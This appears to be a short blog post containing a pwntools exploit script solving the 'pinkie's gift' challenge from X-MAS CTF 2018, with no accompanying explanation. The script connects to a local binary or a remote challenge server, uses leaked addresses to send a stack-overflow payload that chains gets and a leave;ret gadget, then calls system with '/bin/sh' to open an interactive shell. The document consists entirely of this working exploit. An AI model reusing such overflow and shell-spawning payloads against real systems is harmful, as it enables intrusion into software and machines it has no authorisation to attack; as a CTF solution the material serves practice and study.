---
title: xmasctf
abbrlink: 49664
date: 2018-12-15 13:58:07
tags:
---

# pinkie's gift

```
from pwn import *

debug = int(raw_input("debug?:"))

if debug:
    p = process("./pinkiegift")
    context.log_level = "debug"
else:
    p = remote("95.179.163.167", 10006)

p.recvuntil("Santa: ")
binsh = int(p.recvn(9), 16)
system = int(p.recvn(11)[1:], 16)
print "binsh:", hex(binsh)
print "system:", hex(system)

p.sendline("nihao")
p.recvuntil("nihao\n")

gets_address = 0x080483d0
leave_ret = 0x08048607
payload = "a" * 0x84 + p32(binsh) + p32(gets_address) + p32(leave_ret) + p32(binsh + 4)
p.sendline(payload)
payload2 = p32(system) + "ls;a" + p32(binsh + 16) + "/bin/sh"
p.sendline(payload2)
p.interactive()
```

